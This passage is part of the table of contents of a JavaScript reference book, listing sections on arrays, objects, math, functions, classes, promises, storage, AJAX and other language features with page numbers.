[105](#section-12.23-removingadding-elements-using-splice)](#section-12.23-removingadding-elements-using-splice)

[Section 12.24: The entries() method
[105](#section-12.24-the-entries-method)](#section-12.24-the-entries-method)

[Section 12.25: Remove value from array
[105](#section-12.25-remove-value-from-array)](#section-12.25-remove-value-from-array)

[Section 12.26: Flattening Arrays
[106](#section-12.26-flattening-arrays)](#section-12.26-flattening-arrays)

[Section 12.27: Append / Prepend items to Array
[107](#section-12.27-append-prepend-items-to-array)](#section-12.27-append-prepend-items-to-array)

[Section 12.28: Object keys and values to array
[107](#section-12.28-object-keys-and-values-to-array)](#section-12.28-object-keys-and-values-to-array)

[Section 12.29: Logical connective of values
[108](#section-12.29-logical-connective-of-values)](#section-12.29-logical-connective-of-values)

[Section 12.30: Checking if an object is an Array
[108](#section-12.30-checking-if-an-object-is-an-array)](#section-12.30-checking-if-an-object-is-an-array)

[Section 12.31: Insert an item into an array at a specific index
[109](#section-12.31-insert-an-item-into-an-array-at-a-specific-index)](#section-12.31-insert-an-item-into-an-array-at-a-specific-index)

[Section 12.32: Sorting multidimensional array
[109](#section-12.32-sorting-multidimensional-array)](#section-12.32-sorting-multidimensional-array)

[Section 12.33: Test all array items for equality
[110](#section-12.33-test-all-array-items-for-equality)](#section-12.33-test-all-array-items-for-equality)

[Section 12.34: Copy part of an Array
[110](#section-12.34-copy-part-of-an-array)](#section-12.34-copy-part-of-an-array)

[**Chapter 13: Objects**
[112](#chapter-13-objects)](#chapter-13-objects)

[Section 13.1: Shallow cloning
[112](#section-13.1-shallow-cloning)](#section-13.1-shallow-cloning)

[Section 13.2: Object.freeze
[112](#section-13.2-object.freeze)](#section-13.2-object.freeze)

[Section 13.3: Object cloning
[113](#section-13.3-object-cloning)](#section-13.3-object-cloning)

[Section 13.4: Object properties iteration
[114](#section-13.4-object-properties-iteration)](#section-13.4-object-properties-iteration)

[Section 13.5: Object.assign
[115](#section-13.5-object.assign)](#section-13.5-object.assign)

[Section 13.6: Object rest/spread (&hellip;)
[116](#section-13.6-object-restspread-...)](#section-13.6-object-restspread-...)

[Section 13.7: Object.defineProperty
[116](#section-13.7-object.defineproperty)](#section-13.7-object.defineproperty)

[Section 13.8: Accesor properties (get and set)
[117](#section-13.8-accesor-properties-get-and-set)](#section-13.8-accesor-properties-get-and-set)

[Section 13.9: Dynamic / variable property names
[117](#section-13.9-dynamic-variable-property-names)](#section-13.9-dynamic-variable-property-names)

[Section 13.10: Arrays are Objects
[118](#section-13.10-arrays-are-objects)](#section-13.10-arrays-are-objects)

[Section 13.11: Object.seal
[119](#section-13.11-object.seal)](#section-13.11-object.seal)

[Section 13.12: Convert object&apos;s values to array
[120](#section-13.12-convert-objects-values-to-array)](#section-13.12-convert-objects-values-to-array)

[Section 13.13: Retrieving properties from an object
[120](#section-13.13-retrieving-properties-from-an-object)](#section-13.13-retrieving-properties-from-an-object)

[Section 13.14: Read-Only property
[123](#section-13.14-read-only-property)](#section-13.14-read-only-property)

[Section 13.15: Non enumerable property
[123](#section-13.15-non-enumerable-property)](#section-13.15-non-enumerable-property)

[Section 13.16: Lock property description
[123](#section-13.16-lock-property-description)](#section-13.16-lock-property-description)

[Section 13.17: Object.getOwnPropertyDescriptor
[124](#section-13.17-object.getownpropertydescriptor)](#section-13.17-object.getownpropertydescriptor)

[Section 13.18: Descriptors and Named Properties
[124](#section-13.18-descriptors-and-named-properties)](#section-13.18-descriptors-and-named-properties)

[Section 13.19: Object.keys
[126](#section-13.19-object.keys)](#section-13.19-object.keys)

[Section 13.20: Properties with special characters or reserved words
[126](#section-13.20-properties-with-special-characters-or-reserved-words)](#section-13.20-properties-with-special-characters-or-reserved-words)

[Section 13.21: Creating an Iterable object
[127](#section-13.21-creating-an-iterable-object)](#section-13.21-creating-an-iterable-object)

[Section 13.22: Iterating over Object entries - Object.entries()
[127](#section-13.22-iterating-over-object-entriesobject.entries)](#section-13.22-iterating-over-object-entriesobject.entries)

[Section 13.23: Object.values()
[128](#section-13.23-object.values)](#section-13.23-object.values)

[**Chapter 14: Arithmetic (Math)**
[129](#chapter-14-arithmetic-math)](#chapter-14-arithmetic-math)

[Section 14.1: Constants
[129](#section-14.1-constants)](#section-14.1-constants)

[Section 14.2: Remainder / Modulus (%)
[129](#section-14.2-remainder-modulus)](#section-14.2-remainder-modulus)

[Section 14.3: Rounding
[130](#section-14.3-rounding)](#section-14.3-rounding)

[Section 14.4: Trigonometry
[132](#section-14.4-trigonometry)](#section-14.4-trigonometry)

[Section 14.5: Bitwise operators
[133](#section-14.5-bitwise-operators)](#section-14.5-bitwise-operators)

[Section 14.6: Incrementing (++)
[135](#section-14.6-incrementing)](#section-14.6-incrementing)

[Section 14.7: Exponentiation (Math.pow() or &ast;&ast;)
[135](#section-14.7-exponentiation-math.pow-or)](#section-14.7-exponentiation-math.pow-or)

[Section 14.8: Random Integers and Floats
[136](#section-14.8-random-integers-and-floats)](#section-14.8-random-integers-and-floats)

[Section 14.9: Addition (+)
[137](#section-14.9-addition)](#section-14.9-addition)

[Section 14.10: Little / Big endian for typed arrays when using bitwise
operators
[137](#section-14.10-little-big-endian-for-typed-arrays-when-using-bitwise-operators)](#section-14.10-little-big-endian-for-typed-arrays-when-using-bitwise-operators)

[Section 14.11: Get Random Between Two Numbers
[138](#section-14.11-get-random-between-two-numbers)](#section-14.11-get-random-between-two-numbers)

[Section 14.12: Simulating events with dierent probabilities
[139](#section-14.12-simulating-events-with-dierent-probabilities)](#section-14.12-simulating-events-with-dierent-probabilities)

[Section 14.13: Subtraction (-)
[140](#section-14.13-subtraction)](#section-14.13-subtraction)

[Section 14.14: Multiplication (&ast;)
[140](#section-14.14-multiplication)](#section-14.14-multiplication)

[Section 14.15: Getting maximum and minimum
[140](#section-14.15-getting-maximum-and-minimum)](#section-14.15-getting-maximum-and-minimum)

[Section 14.16: Restrict Number to Min/Max Range
[141](#section-14.16-restrict-number-to-minmax-range)](#section-14.16-restrict-number-to-minmax-range)

[Section 14.17: Ceiling and Floor
[141](#section-14.17-ceiling-and-floor)](#section-14.17-ceiling-and-floor)

[Section 14.18: Getting roots of a number
[142](#section-14.18-getting-roots-of-a-number)](#section-14.18-getting-roots-of-a-number)

[Section 14.19: Random with gaussian distribution
[142](#section-14.19-random-with-gaussian-distribution)](#section-14.19-random-with-gaussian-distribution)

[Section 14.20: Math.atan2 to find direction
[143](#section-14.20-math.atan2-to-find-direction)](#section-14.20-math.atan2-to-find-direction)

[Section 14.21: Sin & Cos to create a vector given direction & distance
[143](#section-14.21-sin-cos-to-create-a-vector-given-direction-distance)](#section-14.21-sin-cos-to-create-a-vector-given-direction-distance)

[Section 14.22: Math.hypot
[144](#section-14.22-math.hypot)](#section-14.22-math.hypot)

[Section 14.23: Periodic functions using Math.sin
[145](#section-14.23-periodic-functions-using-math.sin)](#section-14.23-periodic-functions-using-math.sin)

[Section 14.24: Division (/)
[146](#section-14.24-division)](#section-14.24-division)

[Section 14.25: Decrementing (&rpar;
[146](#section-14.25-decrementing)](#section-14.25-decrementing)

[**Chapter 15: Bitwise operators**
[148](#chapter-15-bitwise-operators)](#chapter-15-bitwise-operators)

[Section 15.1: Bitwise operators
[148](#section-15.1-bitwise-operators)](#section-15.1-bitwise-operators)

[Section 15.2: Shift Operators
[150](#section-15.2-shift-operators)](#section-15.2-shift-operators)

[**Chapter 16: Constructor functions**
[151](#chapter-16-constructor-functions)](#chapter-16-constructor-functions)

[Section 16.1: Declaring a constructor function
[151](#section-16.1-declaring-a-constructor-function)](#section-16.1-declaring-a-constructor-function)

[**Chapter 17: Declarations and Assignments**
[152](#chapter-17-declarations-and-assignments)](#chapter-17-declarations-and-assignments)

[Section 17.1: Modifying constants
[152](#section-17.1-modifying-constants)](#section-17.1-modifying-constants)

[Section 17.2: Declaring and initializing constants
[152](#section-17.2-declaring-and-initializing-constants)](#section-17.2-declaring-and-initializing-constants)

[Section 17.3: Declaration
[152](#section-17.3-declaration)](#section-17.3-declaration)

[Section 17.4: Undefined
[153](#section-17.4-undefined)](#section-17.4-undefined)

[Section 17.5: Data Types
[153](#section-17.5-data-types)](#section-17.5-data-types)

[Section 17.6: Mathematic operations and assignment
[153](#section-17.6-mathematic-operations-and-assignment)](#section-17.6-mathematic-operations-and-assignment)

[Section 17.7: Assignment
[155](#section-17.7-assignment)](#section-17.7-assignment)

[**Chapter 18: Loops** [156](#chapter-18-loops)](#chapter-18-loops)

[Section 18.1: Standard &quot;for&quot; loops
[156](#section-18.1-standard-for-loops)](#section-18.1-standard-for-loops)

[Section 18.2: &quot;for &hellip; of&quot; loop
[157](#section-18.2-for-...-of-loop)](#section-18.2-for-...-of-loop)

[Section 18.3: &quot;for &hellip; in&quot; loop
[159](#section-18.3-for-...-in-loop)](#section-18.3-for-...-in-loop)

[Section 18.4: &quot;while&quot; Loops
[159](#section-18.4-while-loops)](#section-18.4-while-loops)

[Section 18.5: &quot;continue&quot; a loop
[160](#section-18.5-continue-a-loop)](#section-18.5-continue-a-loop)

[Section 18.6: Break specific nested loops
[161](#section-18.6-break-specific-nested-loops)](#section-18.6-break-specific-nested-loops)

[Section 18.7: &quot;do &hellip; while&quot; loop
[161](#section-18.7-do-...-while-loop)](#section-18.7-do-...-while-loop)

[Section 18.8: Break and continue labels
[161](#section-18.8-break-and-continue-labels)](#section-18.8-break-and-continue-labels)

[**Chapter 19: Functions**
[163](#chapter-19-functions)](#chapter-19-functions)

[Section 19.1: Function Scoping
[163](#section-19.1-function-scoping)](#section-19.1-function-scoping)

[Section 19.2: Currying
[164](#section-19.2-currying)](#section-19.2-currying)

[Section 19.3: Immediately Invoked Function Expressions
[165](#section-19.3-immediately-invoked-function-expressions)](#section-19.3-immediately-invoked-function-expressions)

[Section 19.4: Named Functions
[166](#section-19.4-named-functions)](#section-19.4-named-functions)

[Section 19.5: Binding &grave;this&grave; and arguments
[169](#section-19.5-binding-this-and-arguments)](#section-19.5-binding-this-and-arguments)

[Section 19.6: Functions with an Unknown Number of Arguments (variadic
functions)
[171](#section-19.6-functions-with-an-unknown-number-of-arguments-variadic-functions)](#section-19.6-functions-with-an-unknown-number-of-arguments-variadic-functions)

[Section 19.7: Anonymous Function
[172](#section-19.7-anonymous-function)](#section-19.7-anonymous-function)

[Section 19.8: Default parameters
[174](#section-19.8-default-parameters)](#section-19.8-default-parameters)

[Section 19.9: Call and apply
[176](#section-19.9-call-and-apply)](#section-19.9-call-and-apply)

[Section 19.10: Partial Application
[177](#section-19.10-partial-application)](#section-19.10-partial-application)

[Section 19.11: Passing arguments by reference or value
[178](#section-19.11-passing-arguments-by-reference-or-value)](#section-19.11-passing-arguments-by-reference-or-value)

[Section 19.12: Function Arguments, &quot;arguments&quot; object, rest and
spread parameters
[179](#section-19.12-function-arguments-arguments-object-rest-and-spread-parameters)](#section-19.12-function-arguments-arguments-object-rest-and-spread-parameters)

[Section 19.13: Function Composition
[179](#section-19.13-function-composition)](#section-19.13-function-composition)

[Section 19.14: Get the name of a function object
[180](#section-19.14-get-the-name-of-a-function-object)](#section-19.14-get-the-name-of-a-function-object)

[Section 19.15: Recursive Function
[180](#section-19.15-recursive-function)](#section-19.15-recursive-function)

[Section 19.16: Using the Return Statement
[181](#section-19.16-using-the-return-statement)](#section-19.16-using-the-return-statement)

[Section 19.17: Functions as a variable
[182](#section-19.17-functions-as-a-variable)](#section-19.17-functions-as-a-variable)

[**Chapter 20: Functional JavaScript**
[185](#chapter-20-functional-javascript)](#chapter-20-functional-javascript)

[Section 20.1: Higher-Order Functions
[185](#section-20.1-higher-order-functions)](#section-20.1-higher-order-functions)

[Section 20.2: Identity Monad
[185](#section-20.2-identity-monad)](#section-20.2-identity-monad)

[Section 20.3: Pure Functions
[187](#section-20.3-pure-functions)](#section-20.3-pure-functions)

[Section 20.4: Accepting Functions as Arguments
[188](#section-20.4-accepting-functions-as-arguments)](#section-20.4-accepting-functions-as-arguments)

[**Chapter 21: Prototypes, objects**
[190](#chapter-21-prototypes-objects)](#chapter-21-prototypes-objects)

[Section 21.1: Creation and initialising Prototype
[190](#section-21.1-creation-and-initialising-prototype)](#section-21.1-creation-and-initialising-prototype)

[**Chapter 22: Classes**
[192](#chapter-22-classes)](#chapter-22-classes)

[Section 22.1: Class Constructor
[192](#section-22.1-class-constructor)](#section-22.1-class-constructor)

[Section 22.2: Class Inheritance
[192](#section-22.2-class-inheritance)](#section-22.2-class-inheritance)

[Section 22.3: Static Methods
[193](#section-22.3-static-methods)](#section-22.3-static-methods)

[Section 22.4: Getters and Setters
[193](#section-22.4-getters-and-setters)](#section-22.4-getters-and-setters)

[Section 22.5: Private Members
[194](#section-22.5-private-members)](#section-22.5-private-members)

[Section 22.6: Methods
[195](#section-22.6-methods)](#section-22.6-methods)

[Section 22.7: Dynamic Method Names
[195](#section-22.7-dynamic-method-names)](#section-22.7-dynamic-method-names)

[Section 22.8: Managing Private Data with Classes
[196](#section-22.8-managing-private-data-with-classes)](#section-22.8-managing-private-data-with-classes)

[Section 22.9: Class Name binding
[198](#section-22.9-class-name-binding)](#section-22.9-class-name-binding)

[**Chapter 23: Namespacing**
[199](#chapter-23-namespacing)](#chapter-23-namespacing)

[Section 23.1: Namespace by direct assignment
[199](#section-23.1-namespace-by-direct-assignment)](#section-23.1-namespace-by-direct-assignment)

[Section 23.2: Nested Namespaces
[199](#section-23.2-nested-namespaces)](#section-23.2-nested-namespaces)

[**Chapter 24: Context (this)**
[200](#chapter-24-context-this)](#chapter-24-context-this)

[Section 24.1: this with simple objects
[200](#section-24.1-this-with-simple-objects)](#section-24.1-this-with-simple-objects)

[Section 24.2: Saving this for use in nested functions / objects
[200](#section-24.2-saving-this-for-use-in-nested-functions-objects)](#section-24.2-saving-this-for-use-in-nested-functions-objects)

[Section 24.3: Binding function context
[201](#section-24.3-binding-function-context)](#section-24.3-binding-function-context)

[Section 24.4: this in constructor functions
[202](#section-24.4-this-in-constructor-functions)](#section-24.4-this-in-constructor-functions)

[**Chapter 25: Setters and Getters**
[203](#chapter-25-setters-and-getters)](#chapter-25-setters-and-getters)

[Section 25.1: Defining a Setter/Getter Using Object.defineProperty
[203](#section-25.1-defining-a-settergetter-using-object.defineproperty)](#section-25.1-defining-a-settergetter-using-object.defineproperty)

[Section 25.2: Defining an Setter/Getter in a Newly Created Object
[203](#section-25.2-defining-an-settergetter-in-a-newly-created-object)](#section-25.2-defining-an-settergetter-in-a-newly-created-object)

[Section 25.3: Defining getters and setters in ES6 class
[203](#section-25.3-defining-getters-and-setters-in-es6-class)](#section-25.3-defining-getters-and-setters-in-es6-class)

[**Chapter 26: Events** [205](#chapter-26-events)](#chapter-26-events)

[Section 26.1: Page, DOM and Browser loading
[205](#section-26.1-page-dom-and-browser-loading)](#section-26.1-page-dom-and-browser-loading)

[**Chapter 27: Inheritance**
[206](#chapter-27-inheritance)](#chapter-27-inheritance)

[Section 27.1: Standard function prototype
[206](#section-27.1-standard-function-prototype)](#section-27.1-standard-function-prototype)

[Section 27.2: Dierence between Object.key and Object.prototype.key
[206](#section-27.2-dierence-between-object.key-and-object.prototype.key)](#section-27.2-dierence-between-object.key-and-object.prototype.key)

[Section 27.3: Prototypal inheritance
[206](#section-27.3-prototypal-inheritance)](#section-27.3-prototypal-inheritance)

[Section 27.4: Pseudo-classical inheritance
[207](#section-27.4-pseudo-classical-inheritance)](#section-27.4-pseudo-classical-inheritance)

[Section 27.5: Setting an Object&apos;s prototype
[208](#section-27.5-setting-an-objects-prototype)](#section-27.5-setting-an-objects-prototype)

[**Chapter 28: Method Chaining**
[210](#chapter-28-method-chaining)](#chapter-28-method-chaining)

[Section 28.1: Chainable object design and chaining
[210](#section-28.1-chainable-object-design-and-chaining)](#section-28.1-chainable-object-design-and-chaining)

[Section 28.2: Method Chaining
[212](#section-28.2-method-chaining)](#section-28.2-method-chaining)

[**Chapter 29: Callbacks**
[213](#chapter-29-callbacks)](#chapter-29-callbacks)

[Section 29.1: Simple Callback Usage Examples
[213](#section-29.1-simple-callback-usage-examples)](#section-29.1-simple-callback-usage-examples)

[Section 29.2: Continuation (synchronous and asynchronous)
[214](#section-29.2-continuation-synchronous-and-asynchronous)](#section-29.2-continuation-synchronous-and-asynchronous)

[Section 29.3: What is a callback?
[215](#section-29.3-what-is-a-callback)](#section-29.3-what-is-a-callback)

[Section 29.4: Callbacks and &grave;this&grave;
[216](#section-29.4-callbacks-and-this)](#section-29.4-callbacks-and-this)

[Section 29.5: Callback using Arrow function
[217](#section-29.5-callback-using-arrow-function)](#section-29.5-callback-using-arrow-function)

[Section 29.6: Error handling and control-flow branching
[218](#section-29.6-error-handling-and-control-flow-branching)](#section-29.6-error-handling-and-control-flow-branching)

[**Chapter 30: Intervals and Timeouts**
[219](#chapter-30-intervals-and-timeouts)](#chapter-30-intervals-and-timeouts)

[Section 30.1: Recursive setTimeout
[219](#section-30.1-recursive-settimeout)](#section-30.1-recursive-settimeout)

[Section 30.2: Intervals
[219](#section-30.2-intervals)](#section-30.2-intervals)

[Section 30.3: Intervals
[219](#section-30.3-intervals)](#section-30.3-intervals)

[Section 30.4: Removing intervals
[220](#section-30.4-removing-intervals)](#section-30.4-removing-intervals)

[Section 30.5: Removing timeouts
[220](#section-30.5-removing-timeouts)](#section-30.5-removing-timeouts)

[Section 30.6: setTimeout, order of operations, clearTimeout
[220](#section-30.6-settimeout-order-of-operations-cleartimeout)](#section-30.6-settimeout-order-of-operations-cleartimeout)

[**Chapter 31: Regular expressions**
[222](#chapter-31-regular-expressions)](#chapter-31-regular-expressions)

[Section 31.1: Creating a RegExp Object
[222](#section-31.1-creating-a-regexp-object)](#section-31.1-creating-a-regexp-object)

[Section 31.2: RegExp Flags
[222](#section-31.2-regexp-flags)](#section-31.2-regexp-flags)

[Section 31.3: Check if string contains pattern using .test()
[223](#section-31.3-check-if-string-contains-pattern-using-.test)](#section-31.3-check-if-string-contains-pattern-using-.test)

[Section 31.4: Matching With .exec()
[223](#section-31.4-matching-with-.exec)](#section-31.4-matching-with-.exec)

[Section 31.5: Using RegExp With Strings
[223](#section-31.5-using-regexp-with-strings)](#section-31.5-using-regexp-with-strings)

[Section 31.6: RegExp Groups
[224](#section-31.6-regexp-groups)](#section-31.6-regexp-groups)

[Section 31.7: Replacing string match with a callback function
[225](#section-31.7-replacing-string-match-with-a-callback-function)](#section-31.7-replacing-string-match-with-a-callback-function)

[Section 31.8: Using Regex.exec() with parentheses regex to extract
matches of a string
[226](#section-31.8-using-regex.exec-with-parentheses-regex-to-extract-matches-of-a-string)](#section-31.8-using-regex.exec-with-parentheses-regex-to-extract-matches-of-a-string)

[**Chapter 32: Cookies**
[228](#chapter-32-cookies)](#chapter-32-cookies)

[Section 32.1: Test if cookies are enabled
[228](#section-32.1-test-if-cookies-are-enabled)](#section-32.1-test-if-cookies-are-enabled)

[Section 32.2: Adding and Setting Cookies
[228](#section-32.2-adding-and-setting-cookies)](#section-32.2-adding-and-setting-cookies)

[Section 32.3: Reading cookies
[228](#section-32.3-reading-cookies)](#section-32.3-reading-cookies)

[Section 32.4: Removing cookies
[228](#section-32.4-removing-cookies)](#section-32.4-removing-cookies)

[**Chapter 33: Web Storage**
[229](#chapter-33-web-storage)](#chapter-33-web-storage)

[Section 33.1: Using localStorage
[229](#section-33.1-using-localstorage)](#section-33.1-using-localstorage)

[Section 33.2: Simpler way of handling Storage
[229](#section-33.2-simpler-way-of-handling-storage)](#section-33.2-simpler-way-of-handling-storage)

[Section 33.3: Storage events
[230](#section-33.3-storage-events)](#section-33.3-storage-events)

[Section 33.4: sessionStorage
[231](#section-33.4-sessionstorage)](#section-33.4-sessionstorage)

[Section 33.5: localStorage length
[232](#section-33.5-localstorage-length)](#section-33.5-localstorage-length)

[Section 33.6: Error conditions
[232](#section-33.6-error-conditions)](#section-33.6-error-conditions)

[Section 33.7: Clearing storage
[232](#section-33.7-clearing-storage)](#section-33.7-clearing-storage)

[Section 33.8: Remove Storage Item
[232](#section-33.8-remove-storage-item)](#section-33.8-remove-storage-item)

[**Chapter 34: Data attributes**
[233](#chapter-34-data-attributes)](#chapter-34-data-attributes)

[Section 34.1: Accessing data attributes
[233](#section-34.1-accessing-data-attributes)](#section-34.1-accessing-data-attributes)

[**Chapter 35: JSON** [234](#chapter-35-json)](#chapter-35-json)

[Section 35.1: JSON versus JavaScript literals
[234](#section-35.1-json-versus-javascript-literals)](#section-35.1-json-versus-javascript-literals)

[Section 35.2: Parsing with a reviver function
[235](#section-35.2-parsing-with-a-reviver-function)](#section-35.2-parsing-with-a-reviver-function)

[Section 35.3: Serializing a value
[236](#section-35.3-serializing-a-value)](#section-35.3-serializing-a-value)

[Section 35.4: Serializing and restoring class instances
[237](#section-35.4-serializing-and-restoring-class-instances)](#section-35.4-serializing-and-restoring-class-instances)

[Section 35.5: Serializing with a replacer function
[238](#section-35.5-serializing-with-a-replacer-function)](#section-35.5-serializing-with-a-replacer-function)

[Section 35.6: Parsing a simple JSON string
[239](#section-35.6-parsing-a-simple-json-string)](#section-35.6-parsing-a-simple-json-string)

[Section 35.7: Cyclic object values
[239](#section-35.7-cyclic-object-values)](#section-35.7-cyclic-object-values)

[**Chapter 36: AJAX** [240](#chapter-36-ajax)](#chapter-36-ajax)

[Section 36.1: Sending and Receiving JSON Data via POST
[240](#section-36.1-sending-and-receiving-json-data-via-post)](#section-36.1-sending-and-receiving-json-data-via-post)

[Section 36.2: Add an AJAX preloader
[240](#section-36.2-add-an-ajax-preloader)](#section-36.2-add-an-ajax-preloader)

[Section 36.3: Displaying the top JavaScript questions of the month from
Stack Overflow&apos;s API
[241](#section-36.3-displaying-the-top-javascript-questions-of-the-month-from-stack-overflows-api)](#section-36.3-displaying-the-top-javascript-questions-of-the-month-from-stack-overflows-api)

[Section 36.4: Using GET with parameters
[242](#section-36.4-using-get-with-parameters)](#section-36.4-using-get-with-parameters)

[Section 36.5: Check if a file exists via a HEAD request
[243](#section-36.5-check-if-a-file-exists-via-a-head-request)](#section-36.5-check-if-a-file-exists-via-a-head-request)

[Section 36.6: Using GET and no parameters
[243](#section-36.6-using-get-and-no-parameters)](#section-36.6-using-get-and-no-parameters)

[Section 36.7: Listening to AJAX events at a global level
[243](#section-36.7-listening-to-ajax-events-at-a-global-level)](#section-36.7-listening-to-ajax-events-at-a-global-level)

[**Chapter 37: Enumerations**
[244](#chapter-37-enumerations)](#chapter-37-enumerations)

[Section 37.1: Enum definition using Object.freeze()
[244](#section-37.1-enum-definition-using-object.freeze)](#section-37.1-enum-definition-using-object.freeze)

[Section 37.2: Alternate definition
[244](#section-37.2-alternate-definition)](#section-37.2-alternate-definition)

[Section 37.3: Printing an enum variable
[244](#section-37.3-printing-an-enum-variable)](#section-37.3-printing-an-enum-variable)

[Section 37.4: Implementing Enums Using Symbols
[245](#section-37.4-implementing-enums-using-symbols)](#section-37.4-implementing-enums-using-symbols)

[Section 37.5: Automatic Enumeration Value
[245](#section-37.5-automatic-enumeration-value)](#section-37.5-automatic-enumeration-value)

[**Chapter 38: Map** [247](#chapter-38-map)](#chapter-38-map)

[Section 38.1: Creating a Map
[247](#section-38.1-creating-a-map)](#section-38.1-creating-a-map)

[Section 38.2: Clearing a Map
[247](#section-38.2-clearing-a-map)](#section-38.2-clearing-a-map)

[Section 38.3: Removing an element from a Map
[247](#section-38.3-removing-an-element-from-a-map)](#section-38.3-removing-an-element-from-a-map)

[Section 38.4: Checking if a key exists in a Map
[248](#section-38.4-checking-if-a-key-exists-in-a-map)](#section-38.4-checking-if-a-key-exists-in-a-map)

[Section 38.5: Iterating Maps
[248](#section-38.5-iterating-maps)](#section-38.5-iterating-maps)

[Section 38.6: Getting and setting elements
[248](#section-38.6-getting-and-setting-elements)](#section-38.6-getting-and-setting-elements)

[Section 38.7: Getting the number of elements of a Map
[249](#section-38.7-getting-the-number-of-elements-of-a-map)](#section-38.7-getting-the-number-of-elements-of-a-map)

[**Chapter 39: Timestamps**
[250](#chapter-39-timestamps)](#chapter-39-timestamps)

[Section 39.1: High-resolution timestamps
[250](#section-39.1-high-resolution-timestamps)](#section-39.1-high-resolution-timestamps)

[Section 39.2: Get Timestamp in Seconds
[250](#section-39.2-get-timestamp-in-seconds)](#section-39.2-get-timestamp-in-seconds)

[Section 39.3: Low-resolution timestamps
[250](#section-39.3-low-resolution-timestamps)](#section-39.3-low-resolution-timestamps)

[Section 39.4: Support for legacy browsers
[250](#section-39.4-support-for-legacy-browsers)](#section-39.4-support-for-legacy-browsers)

[**Chapter 40: Unary Operators**
[251](#chapter-40-unary-operators)](#chapter-40-unary-operators)

[Section 40.1: Overview
[251](#section-40.1-overview)](#section-40.1-overview)

[Section 40.2: The typeof operator
[251](#section-40.2-the-typeof-operator)](#section-40.2-the-typeof-operator)

[Section 40.3: The delete operator
[252](#section-40.3-the-delete-operator)](#section-40.3-the-delete-operator)

[Section 40.4: The unary plus operator (+)
[253](#section-40.4-the-unary-plus-operator)](#section-40.4-the-unary-plus-operator)

[Section 40.5: The void operator
[254](#section-40.5-the-void-operator)](#section-40.5-the-void-operator)

[Section 40.6: The unary negation operator (-)
[255](#section-40.6-the-unary-negation-operator)](#section-40.6-the-unary-negation-operator)

[Section 40.7: The bitwise NOT operator (&bsol;~)
[255](#section-40.7-the-bitwise-not-operator)](#section-40.7-the-bitwise-not-operator)

[Section 40.8: The logical NOT operator (!)
[256](#section-40.8-the-logical-not-operator)](#section-40.8-the-logical-not-operator)

[**Chapter 41: Generators**
[258](#chapter-41-generators)](#chapter-41-generators)

[Section 41.1: Generator Functions
[258](#section-41.1-generator-functions)](#section-41.1-generator-functions)

[Section 41.2: Sending Values to Generator
[259](#section-41.2-sending-values-to-generator)](#section-41.2-sending-values-to-generator)

[Section 41.3: Delegating to other Generator
[259](#section-41.3-delegating-to-other-generator)](#section-41.3-delegating-to-other-generator)

[Section 41.4: Iteration
[259](#section-41.4-iteration)](#section-41.4-iteration)

[Section 41.5: Async flow with generators
[260](#section-41.5-async-flow-with-generators)](#section-41.5-async-flow-with-generators)

[Section 41.6: Iterator-Observer interface
[261](#section-41.6-iterator-observer-interface)](#section-41.6-iterator-observer-interface)

[**Chapter 42: Promises**
[263](#chapter-42-promises)](#chapter-42-promises)

[Section 42.1: Introduction
[263](#section-42.1-introduction)](#section-42.1-introduction)

[Section 42.2: Promise chaining
[264](#section-42.2-promise-chaining)](#section-42.2-promise-chaining)

[Section 42.3: Waiting for multiple concurrent promises
[265](#section-42.3-waiting-for-multiple-concurrent-promises)](#section-42.3-waiting-for-multiple-concurrent-promises)

[Section 42.4: Reduce an array to chained promises
[266](#section-42.4-reduce-an-array-to-chained-promises)](#section-42.4-reduce-an-array-to-chained-promises)

[Section 42.5: Waiting for the first of multiple concurrent promises
[267](#section-42.5-waiting-for-the-first-of-multiple-concurrent-promises)](#section-42.5-waiting-for-the-first-of-multiple-concurrent-promises)

[Section 42.6: &quot;Promisifying&quot; functions with callbacks
[268](#section-42.6-promisifying-functions-with-callbacks)](#section-42.6-promisifying-functions-with-callbacks)

[Section 42.7: Error Handling
[268](#section-42.7-error-handling)](#section-42.7-error-handling)

[Section 42.8: Reconciling synchronous and asynchronous operations
[272](#section-42.8-reconciling-synchronous-and-asynchronous-operations)](#section-42.8-reconciling-synchronous-and-asynchronous-operations)

[Section 42.9: Delay function call
[273](#section-42.9-delay-function-call)](#section-42.9-delay-function-call)

[Section 42.10: &quot;Promisifying&quot; values
[273](#section-42.10-promisifying-values)](#section-42.10-promisifying-values)

[Section 42.11: Using ES2017 async/await
[274](#section-42.11-using-es2017-asyncawait)](#section-42.11-using-es2017-asyncawait)

[Section 42.12: Performing cleanup with finally()
[274](#section-42.12-performing-cleanup-with-finally)](#section-42.12-performing-cleanup-with-finally)

[Section 42.13: forEach with promises
[275](#section-42.13-foreach-with-promises)](#section-42.13-foreach-with-promises)

[Section 42.14: Asynchronous API request
[275](#section-42.14-asynchronous-api-request)](#section-42.14-asynchronous-api-request)

[**Chapter 43: Set** [277](#chapter-43-set)](#chapter-43-set)

[Section 43.1: Creating a Set
[277](#section-43.1-creating-a-set)](#section-43.1-creating-a-set)

[Section 43.2: Adding a value to a Set
[277](#section-43.2-adding-a-value-to-a-set)](#section-43.2-adding-a-value-to-a-set)

[Section 43.3: Removing value from a set
[277](#section-43.3-removing-value-from-a-set)](#section-43.3-removing-value-from-a-set)

[Section 43.4: Checking if a value exist in a set
[278](#section-43.4-checking-if-a-value-exist-in-a-set)](#section-43.4-checking-if-a-value-exist-in-a-set)

[Section 43.5: Clearing a Set
[278](#section-43.5-clearing-a-set)](#section-43.5-clearing-a-set)

[Section 43.6: Getting set length
[278](#section-43.6-getting-set-length)](#section-43.6-getting-set-length)

[Section 43.7: Converting Sets to arrays
[278](#section-43.7-converting-sets-to-arrays)](#section-43.7-converting-sets-to-arrays)

[Section 43.8: Intersection and dierence in Sets
[279](#section-43.8-intersection-and-dierence-in-sets)](#section-43.8-intersection-and-dierence-in-sets)

[Section 43.9: Iterating Sets
[279](#section-43.9-iterating-sets)](#section-43.9-iterating-sets)

[**Chapter 44: Modals - Prompts**
[280](#chapter-44-modalsprompts)](#chapter-44-modalsprompts)

[Section 44.1: About User Prompts
[280](#section-44.1-about-user-prompts)](#section-44.1-about-user-prompts)

[Section 44.2: Persistent Prompt Modal
[280](#section-44.2-persistent-prompt-modal)](#section-44.2-persistent-prompt-modal)

[Section 44.3: Confirm to Delete element
[281](#section-44.3-confirm-to-delete-element)](#section-44.3-confirm-to-delete-element)

[Section 44.4: Usage of alert()
[281](#section-44.4-usage-of-alert)](#section-44.4-usage-of-alert)

[Section 44.5: Usage of prompt()
[282](#section-44.5-usage-of-prompt)](#section-44.5-usage-of-prompt)

[**Chapter 45: execCommand and contenteditable**
